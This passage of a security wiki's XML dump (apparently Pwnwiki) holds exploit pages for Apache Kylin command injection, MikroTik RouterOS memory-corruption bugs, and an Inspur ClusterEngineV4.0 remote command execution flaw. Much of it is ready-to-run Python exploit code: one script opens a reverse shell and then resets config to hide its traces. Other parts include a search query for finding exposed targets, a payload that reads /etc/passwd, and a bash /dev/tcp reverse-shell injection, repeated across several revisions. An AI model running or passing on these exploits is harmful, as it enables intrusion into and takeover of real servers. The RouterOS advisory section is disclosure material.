        except:
            print("\033[31m[x] 漏洞利用失败 \033[0m")
            sys.exit(0)

def POC_3(target_url, cookie):
    print("\033[35m[o] 正在反弹shell......\033[0m")
    vuln_url = target_url + "/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie": "project=null;JSESSIONID=" + cookie
    }
    try:
        response = requests.post(url=vuln_url, headers=headers)
        POC_4(target_url, cookie)
    except:
        print("\033[31m[x] 漏洞利用失败 \033[0m")
        sys.exit(0)

def POC_4(target_url, cookie):
    config_url = target_url + "/kylin/api/admin/config"

    key = ["kylin.tool.auto-migrate-cube.enabled", "kylin.tool.auto-migrate-cube.src-config",
           "kylin.tool.auto-migrate-cube.dest-config"]
    value = ["flase", "echo;echo;echo", "None"]

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Pragma": "no-cache",
        "Cookie": "project=null;JSESSIONID=" + cookie
    }

    for i in range(0,3):
        data = """{"key":"%s","value":"%s"}""" % (key[i], value[i])
        try:
            response = requests.put(url=config_url, headers=headers, data=data, timeout=20)
            if response.status_code == 200:
                print("\033[32m[o] 成功将" + key[i] +"设置为" + value[i] +"\033[0m")
            else:
                print("\033[31m[x] 设置" + key[i] +"为" + value[i] +"失败\033[0m")
                sys.exit(0)
        except:
            print("\033[31m[x] 漏洞利用失败 \033[0m")
            sys.exit(0)
    print("\033[35m[o] 成功清理痕迹\033[0m")


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    try:
        cookie,Authorization = POC_1(target_url)
    except:
        print("\033[31m[x] 漏洞利用失败 \033[0m")
        sys.exit(0)
    IP = str(input("\033[35m请输入监听IP   &gt;&gt;&gt; \033[0m"))
    PORT = str(input("\033[35m请输入监听PORT &gt;&gt;&gt; \033[0m"))
    POC_2(target_url, cookie, IP, PORT, Authorization)
    POC_3(target_url, cookie)
&lt;/pre&gt;


== Ссылка ==
https://poc.wgpsec.org/PeiQi_Wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-1956.html</text>
      <sha1>pskwymtppqbzpfi9h51glpm541397no</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-20220&amp;CVE-2020-20227&amp;CVE-2020-20245&amp;CVE-2020-20246 MikroTik RouterOS 內存損壞漏洞</title>
    <ns>0</ns>
    <id>2348</id>
    <revision>
      <id>2796</id>
      <timestamp>2021-05-12T09:01:01Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; Advisory: four vulnerabilities found in MikroTik's RouterOS   Details =======  Product: MikroTik's RouterOS Vendor URL: https://mikrotik.com/ Vendor Status: onl..."</comment>
      <origin>2796</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9762" sha1="ci5fye0tefuti85lsyr7sxvn6vi4k19" xml:space="preserve">==INFO==
&lt;pre&gt;
Advisory: four vulnerabilities found in MikroTik's RouterOS


Details
=======

Product: MikroTik's RouterOS
Vendor URL: https://mikrotik.com/
Vendor Status: only CVE-2020-20227 is fixed
CVE: CVE-2020-20220, CVE-2020-20227, CVE-2020-20245, CVE-2020-20246
Credit: Qian Chen(@cq674350529) of Qihoo 360 Nirvan Team


Product Description
==================

RouterOS is the operating system used on the MikroTik's devices, such as
switch, router and access point.


Description of vulnerabilities
==========================
These vulnerabilities were reported to the vendor almost one year ago. And
the vendor confirmed these vulnerabilities.

1. CVE-2020-20220
The bfd process suffers from a memory corruption vulnerability. By sending
a crafted packet, an authenticated remote user can crash the bfd process
due to invalid memory access.

Against stable 6.46.5, the poc resulted in the following crash dump.

    # cat /rw/logs/backtrace.log
    2020.06.19-18:36:13.88@0:
    2020.06.19-18:36:13.88@0:
    2020.06.19-18:36:13.88@0: /ram/pckg/routing/nova/bin/bfd
    2020.06.19-18:36:13.88@0: --- signal=11
--------------------------------------------
    2020.06.19-18:36:13.88@0:
    2020.06.19-18:36:13.88@0: eip=0x0804b175 eflags=0x00010202
    2020.06.19-18:36:13.88@0: edi=0x08054a90 esi=0x08054298 ebp=0x7f9d3e88
esp=0x7f9d3e70
    2020.06.19-18:36:13.88@0: eax=0x08050634 ebx=0x77777af0 ecx=0x08051274
edx=0x00000001
    2020.06.19-18:36:13.88@0:
    2020.06.19-18:36:13.88@0: maps:
    2020.06.19-18:36:13.88@0: 08048000-08050000 r-xp 00000000 00:1b 16
    /ram/pckg/routing/nova/bin/bfd
    2020.06.19-18:36:13.88@0: 7759a000-7759c000 r-xp 00000000 00:0c 959
   /lib/libdl-0.9.33.2.so
    2020.06.19-18:36:13.88@0: 7759e000-775d3000 r-xp 00000000 00:0c 964
   /lib/libuClibc-0.9.33.2.so
    2020.06.19-18:36:13.88@0: 775d7000-775f1000 r-xp 00000000 00:0c 960
   /lib/libgcc_s.so.1
    2020.06.19-18:36:13.88@0: 775f2000-77601000 r-xp 00000000 00:0c 944
   /lib/libuc++.so
    2020.06.19-18:36:13.88@0: 77602000-7775f000 r-xp 00000000 00:0c 954
   /lib/libcrypto.so.1.0.0
    2020.06.19-18:36:13.88@0: 7776f000-77777000 r-xp 00000000 00:0c 950
   /lib/libubox.so
    2020.06.19-18:36:13.88@0: 77778000-777c4000 r-xp 00000000 00:0c 946
   /lib/libumsg.so
    2020.06.19-18:36:13.88@0: 777ca000-777d1000 r-xp 00000000 00:0c 958
   /lib/ld-uClibc-0.9.33.2.so
    2020.06.19-18:36:13.88@0:
    2020.06.19-18:36:13.88@0: stack: 0x7f9d4000 - 0x7f9d3e70
    2020.06.19-18:36:13.88@0: 34 06 05 08 d0 e6 04 08 d8 3e 9d 7f 90 4a 05
08 98 42 05 08 d8 3e 9d 7f f8 3e 9d 7f 6d 39 77 77
    2020.06.19-18:36:13.88@0: 90 4a 05 08 28 40 9d 7f 05 00 00 00 00 43 05
08 00 00 00 00 28 90 7c 77 01 00 00 00 0c 00 00 00
    2020.06.19-18:36:13.88@0:
    2020.06.19-18:36:13.88@0: code: 0x804b175
    2020.06.19-18:36:13.88@0: ff 05 00 00 00 00 83 c4 10 c9 c3 55 89 e5 53
83

This vulnerability was initially found in long-term 6.44.6, and it seems
that the latest stable version 6.48.2 still suffer from this vulnerability.

2. CVE-2020-20227
The diskd process suffers from a memory corruption vulnerability. By
sending a crafted packet, an authenticated remote user can crash the diskd
process due to invalid memory access.

Against stable 6.47, the poc resulted in the following crash dump.

    # cat /rw/logs/backtrace.log
    2020.06.05-15:00:38.33@0:
    2020.06.05-15:00:38.33@0:
    2020.06.05-15:00:38.33@0: /nova/bin/diskd
    2020.06.05-15:00:38.33@0: --- signal=11
--------------------------------------------
    2020.06.05-15:00:38.33@0:
    2020.06.05-15:00:38.33@0: eip=0x7775a1e3 eflags=0x00010202
    2020.06.05-15:00:38.33@0: edi=0x7f9dd024 esi=0x0000000a ebp=0x7f9dceb8
esp=0x7f9dceac
    2020.06.05-15:00:38.33@0: eax=0x0000000a ebx=0x777624ec ecx=0x08054600
edx=0x08056e18
    2020.06.05-15:00:38.33@0:
    2020.06.05-15:00:38.33@0: maps:
    2020.06.05-15:00:38.33@0: 08048000-08052000 r-xp 00000000 00:0c 1049
    /nova/bin/diskd
    2020.06.05-15:00:38.33@0: 776ff000-77734000 r-xp 00000000 00:0c 966
   /lib/libuClibc-0.9.33.2.so
    2020.06.05-15:00:38.33@0: 77738000-77752000 r-xp 00000000 00:0c 962
   /lib/libgcc_s.so.1
    2020.06.05-15:00:38.33@0: 77753000-77762000 r-xp 00000000 00:0c 945
   /lib/libuc++.so
    2020.06.05-15:00:38.33@0: 77763000-7776b000 r-xp 00000000 00:0c 951
   /lib/libubox.so
    2020.06.05-15:00:38.33@0: 7776c000-777b8000 r-xp 00000000 00:0c 947
   /lib/libumsg.so
    2020.06.05-15:00:38.33@0: 777be000-777c5000 r-xp 00000000 00:0c 960
   /lib/ld-uClibc-0.9.33.2.so
    2020.06.05-15:00:38.33@0:
    2020.06.05-15:00:38.33@0: stack: 0x7f9de000 - 0x7f9dceac
    2020.06.05-15:00:38.33@0: f4 8a 7b 77 0a 00 00 00 f4 8a 7b 77 e8 ce 9d
7f 92 be 78 77 f8 45 05 08 0a 00 00 00 18 6e 05 08
    2020.06.05-15:00:38.33@0: 18 6e 05 08 e4 ce 9d 7f 24 d0 9d 7f 7c 18 76
77 24 d0 9d 7f 18 69 05 08 40 cf 9d 7f a8 cf 9d 7f
    2020.06.05-15:00:38.34@0:
    2020.06.05-15:00:38.34@0: code: 0x7775a1e3
    2020.06.05-15:00:38.34@0: 8b 00 8b 10 01 c2 83 c2 04 52 83 c0 04 50 ff
75

This vulnerability was initially found in stable 6.47, and it was fixed at
least in stable 6.48.1.

3. CVE-2020-20245
The log process suffers from a memory corruption vulnerability. By sending
a crafted packet, an authenticated remote user can crash the log process
due to invalid memory access.

Against stable 6.47, the poc resulted in the following crash dump.

    # cat /rw/logs/backtrace.log
    2020.06.22-20:13:36.29@0:
    2020.06.22-20:13:36.29@0:
    2020.06.22-20:13:36.62@0: /nova/bin/log
    2020.06.22-20:13:36.62@0: --- signal=11
--------------------------------------------
    2020.06.22-20:13:36.62@0:
    2020.06.22-20:13:36.62@0: eip=0x77709d2e eflags=0x00010202
    2020.06.22-20:13:36.62@0: edi=0x0000004b esi=0x77718f00 ebp=0x7fec6858
esp=0x7fec6818
    2020.06.22-20:13:36.62@0: eax=0x00000031 ebx=0x77717000 ecx=0x777171e8
edx=0x00000006
    2020.06.22-20:13:36.62@0:
    2020.06.22-20:13:36.62@0: maps:
    2020.06.22-20:13:36.62@0: 08048000-08058000 r-xp 00000000 00:0c 1005
    /nova/bin/log
    2020.06.22-20:13:36.62@0: 776e1000-77716000 r-xp 00000000 00:0c 966
   /lib/libuClibc-0.9.33.2.so
    2020.06.22-20:13:36.62@0: 7771a000-77734000 r-xp 00000000 00:0c 962
   /lib/libgcc_s.so.1
    2020.06.22-20:13:36.62@0: 77735000-77744000 r-xp 00000000 00:0c 945
   /lib/libuc++.so
    2020.06.22-20:13:36.62@0: 77745000-77791000 r-xp 00000000 00:0c 947
   /lib/libumsg.so
    2020.06.22-20:13:36.62@0: 77797000-7779e000 r-xp 00000000 00:0c 960
   /lib/ld-uClibc-0.9.33.2.so
    2020.06.22-20:13:36.62@0:
    2020.06.22-20:13:36.62@0: stack: 0x7fec7000 - 0x7fec6818
    2020.06.22-20:13:36.62@0: 48 68 ec 7f 7b ce 73 77 00 00 00 00 10 00 00
00 00 00 00 00 00 00 00 00 68 68 ec 7f 21 ac 70 77
    2020.06.22-20:13:36.62@0: 40 00 00 00 1b fb 70 77 e8 71 71 77 c0 28 06
08 88 68 ec 7f ec 44 74 77 e4 29 06 08 40 69 ec 7f
    2020.06.22-20:13:36.62@0:
    2020.06.22-20:13:36.62@0: code: 0x77709d2e
    2020.06.22-20:13:36.62@0: 8b 48 08 89 4c 96 04 e9 93 05 00 00 81 7d e0
ff

This vulnerability was initially found in stable 6.46.3, and it seems that
the latest stable version 6.48.2 still suffers from this vulnerability.

4. CVE-2020-20246
The mactel process suffers from a memory corruption vulnerability. By
sending a crafted packet, an authenticated remote user can crash the mactel
process due to NULL pointer dereference.

Against stable 6.47, the poc resulted in the following crash dump.

    # cat /rw/logs/backtrace.log
    2020.06.22-20:25:36.17@0:
    2020.06.22-20:25:36.17@0:
    2020.06.22-20:25:36.17@0: /nova/bin/mactel
    2020.06.22-20:25:36.17@0: --- signal=11
--------------------------------------------
    2020.06.22-20:25:36.17@0:
    2020.06.22-20:25:36.17@0: eip=0x0804ddc7 eflags=0x00010202
    2020.06.22-20:25:36.17@0: edi=0x08055740 esi=0x7fe78144 ebp=0x7fe780c8
esp=0x7fe78090
    2020.06.22-20:25:36.17@0: eax=0x00000000 ebx=0x776b9b40 ecx=0x0000000b
edx=0xffffffff
    2020.06.22-20:25:36.17@0:
    2020.06.22-20:25:36.17@0: maps:
    2020.06.22-20:25:36.17@0: 08048000-08051000 r-xp 00000000 00:0c 1041
    /nova/bin/mactel
    2020.06.22-20:25:36.17@0: 7762c000-77661000 r-xp 00000000 00:0c 966
   /lib/libuClibc-0.9.33.2.so
    2020.06.22-20:25:36.17@0: 77665000-7767f000 r-xp 00000000 00:0c 962
   /lib/libgcc_s.so.1
    2020.06.22-20:25:36.17@0: 77680000-7768f000 r-xp 00000000 00:0c 945
   /lib/libuc++.so
    2020.06.22-20:25:36.17@0: 77690000-776ad000 r-xp 00000000 00:0c 948
   /lib/libucrypto.so
    2020.06.22-20:25:36.17@0: 776ae000-776af000 r-xp 00000000 00:0c 967
   /lib/libutil-0.9.33.2.so
    2020.06.22-20:25:36.17@0: 776b1000-776b9000 r-xp 00000000 00:0c 951
   /lib/libubox.so
    2020.06.22-20:25:36.17@0: 776ba000-77706000 r-xp 00000000 00:0c 947
   /lib/libumsg.so
    2020.06.22-20:25:36.17@0: 7770c000-77713000 r-xp 00000000 00:0c 960
   /lib/ld-uClibc-0.9.33.2.so
    2020.06.22-20:25:36.17@0:
    2020.06.22-20:25:36.17@0: stack: 0x7fe79000 - 0x7fe78090
    2020.06.22-20:25:36.17@0: 44 81 e7 7f 01 00 00 00 ff ff ff ff 1f d0 04
08 58 57 05 08 28 b0 70 77 01 00 00 00 00 00 00 00
    2020.06.22-20:25:36.17@0: 1c 85 e7 7f 04 1d 05 08 02 db 70 77 40 9b 6b
77 40 57 05 08 44 81 e7 7f f8 80 e7 7f 7c 4a 6b 77
    2020.06.22-20:25:36.17@0:
    2020.06.22-20:25:36.17@0: code: 0x804ddc7
    2020.06.22-20:25:36.17@0: 8b 50 2f 89 55 da 66 8b 40 33 66 89 45 de 83
c4

This vulnerability was initially found in stable 6.46.3, and it seems that
the latest stable version 6.48.2 still suffers from this vulnerability.


Solution
========

As to CVE-2020-20227, upgrade to the corresponding latest RouterOS tree
version. For others, no upgrade firmware available yet


References
==========

[1] https://mikrotik.com/download/changelogs/stable-release-tree
&lt;/pre&gt;</text>
      <sha1>ci5fye0tefuti85lsyr7sxvn6vi4k19</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-21224 浪潮ClusterEngineV4.0 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>3709</id>
    <revision>
      <id>4302</id>
      <timestamp>2021-06-09T06:26:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響==  浪潮ClusterEngineV4.0 &lt;/translate&gt;  ==FOFA== &lt;pre&gt; title="TSCEV4.0" &lt;/pre&gt;   ==POC== &lt;translate&gt; 出現 root:x:0:0 則存在漏..."</comment>
      <origin>4302</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3979" sha1="4lz59lgn7ytrv1bbfrrv84sg8n4plno" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==

浪潮ClusterEngineV4.0
&lt;/translate&gt;

==FOFA==
&lt;pre&gt;
title="TSCEV4.0"
&lt;/pre&gt;


==POC==
&lt;translate&gt;
出現 root:x:0:0 則存在漏洞
&lt;/translate&gt;
&lt;pre&gt;
op=login&amp;username=test`$(cat /etc/passwd)`

{"err":"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\n","exitcode":1,"out":"the user test does not exist\nerror:1\n"}
&lt;/pre&gt;

&lt;translate&gt;
==反彈shell==
&lt;/translate&gt;
&lt;pre&gt;
op=login&amp;username=test`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)`
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 浪潮ClusterEngineV4.0                                     \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mIP          &gt;&gt;&gt; xxx.xxx.xxx.xxx:9999                              \033[0m')
    print('+  \033[36mPORT        &gt;&gt;&gt; 9999                                              \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    }
    data = "op=login&amp;username=test`$(cat /etc/passwd)`"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=4)
        etc_passwd = re.findall(r'\{"err":"/bin/sh: (.*?): No such', response.text)
        if response.status_code == 200 and "root:x:0:0" in response.text:
            print("\033[32m[o]    目标 {} 可能存在漏洞, 响应为:{} \033[0m".format(target_url, etc_passwd[0]))
            POC_2(target_url)
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

def POC_2(target_url):
    IP = str(input("\033[35m请输入监听IP   &gt;&gt;&gt; \033[0m"))
    PORT = str(input("\033[35m请输入监听PORT &gt;&gt;&gt; \033[0m"))
    vuln_url = target_url + "/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    }
    data = "op=login&amp;username=`bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261`".format(IP, PORT)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False)
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl    &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)

&lt;/pre&gt;

&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://short.pwnwiki.org/?c=aLBsJw</text>
      <sha1>4lz59lgn7ytrv1bbfrrv84sg8n4plno</sha1>
    </revision>
    <revision>
      <id>4303</id>
      <parentid>4302</parentid>
      <timestamp>2021-06-09T06:28:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4303</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4034" sha1="8gefz55x7tnj6rx4cnwp17as2y9fuqn" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;

&lt;!--T:2--&gt;
浪潮ClusterEngineV4.0
&lt;/translate&gt;

==FOFA==
&lt;pre&gt;
title="TSCEV4.0"
&lt;/pre&gt;


==POC==
&lt;translate&gt;
&lt;!--T:3--&gt;
出現 root:x:0:0 則存在漏洞
&lt;/translate&gt;
&lt;pre&gt;
op=login&amp;username=test`$(cat /etc/passwd)`

{"err":"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\n","exitcode":1,"out":"the user test does not exist\nerror:1\n"}
&lt;/pre&gt;

&lt;translate&gt;
==反彈shell== &lt;!--T:4--&gt;
&lt;/translate&gt;
&lt;pre&gt;
op=login&amp;username=test`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)`
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 浪潮ClusterEngineV4.0                                     \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mIP          &gt;&gt;&gt; xxx.xxx.xxx.xxx:9999                              \033[0m')
    print('+  \033[36mPORT        &gt;&gt;&gt; 9999                                              \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    }
    data = "op=login&amp;username=test`$(cat /etc/passwd)`"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=4)
        etc_passwd = re.findall(r'\{"err":"/bin/sh: (.*?): No such', response.text)
        if response.status_code == 200 and "root:x:0:0" in response.text:
            print("\033[32m[o]    目标 {} 可能存在漏洞, 响应为:{} \033[0m".format(target_url, etc_passwd[0]))
            POC_2(target_url)
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

def POC_2(target_url):
    IP = str(input("\033[35m请输入监听IP   &gt;&gt;&gt; \033[0m"))
    PORT = str(input("\033[35m请输入监听PORT &gt;&gt;&gt; \033[0m"))
    vuln_url = target_url + "/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    }
    data = "op=login&amp;username=`bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261`".format(IP, PORT)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False)
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl    &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)

&lt;/pre&gt;

&lt;translate&gt;
==參考== &lt;!--T:5--&gt;
&lt;/translate&gt;
https://short.pwnwiki.org/?c=aLBsJw</text>
      <sha1>8gefz55x7tnj6rx4cnwp17as2y9fuqn</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-21224 浪潮ClusterEngineV4.0 遠程命令執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3719</id>
    <revision>
      <id>4313</id>
      <timestamp>2021-06-09T06:28:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影响=="</comment>
      <origin>4313</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4062" sha1="185n4n2wq696b3zyruobful9m0cxt1l" xml:space="preserve">&lt;languages /&gt;
==漏洞影响==

浪潮ClusterEngineV4.0

==FOFA==
&lt;pre&gt;
title="TSCEV4.0"
&lt;/pre&gt;


==POC==
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
出現 root:x:0:0 則存在漏洞
&lt;/div&gt;
&lt;pre&gt;
op=login&amp;username=test`$(cat /etc/passwd)`

{"err":"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\n","exitcode":1,"out":"the user test does not exist\nerror:1\n"}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==反彈shell==
&lt;/div&gt;
&lt;pre&gt;
op=login&amp;username=test`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)`
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 浪潮ClusterEngineV4.0                                     \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mIP          &gt;&gt;&gt; xxx.xxx.xxx.xxx:9999                              \033[0m')
    print('+  \033[36mPORT        &gt;&gt;&gt; 9999                                              \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    }
    data = "op=login&amp;username=test`$(cat /etc/passwd)`"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=4)
        etc_passwd = re.findall(r'\{"err":"/bin/sh: (.*?): No such', response.text)
        if response.status_code == 200 and "root:x:0:0" in response.text:
            print("\033[32m[o]    目标 {} 可能存在漏洞, 响应为:{} \033[0m".format(target_url, etc_passwd[0]))
            POC_2(target_url)
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

def POC_2(target_url):
    IP = str(input("\033[35m请输入监听IP   &gt;&gt;&gt; \033[0m"))
    PORT = str(input("\033[35m请输入监听PORT &gt;&gt;&gt; \033[0m"))
    vuln_url = target_url + "/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    }
    data = "op=login&amp;username=`bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261`".format(IP, PORT)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False)
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl    &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)

&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://short.pwnwiki.org/?c=aLBsJw</text>
      <sha1>185n4n2wq696b3zyruobful9m0cxt1l</sha1>
    </revision>
    <revision>
      <id>4317</id>
      <parentid>4313</parentid>
      <timestamp>2021-06-09T06:29:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==参考=="</comment>
      <origin>4317</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3879" sha1="27lul3slwvy7ddj2hkz1d5514l57x49" xml:space="preserve">&lt;languages /&gt;
==漏洞影响==

浪潮ClusterEngineV4.0

==FOFA==
&lt;pre&gt;
title="TSCEV4.0"
&lt;/pre&gt;


==POC==
出现 root:x:0:0 则存在漏洞
&lt;pre&gt;
op=login&amp;username=test`$(cat /etc/passwd)`

{"err":"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\n","exitcode":1,"out":"the user test does not exist\nerror:1\n"}
&lt;/pre&gt;

==反弹shell==
&lt;pre&gt;
op=login&amp;username=test`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)`
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
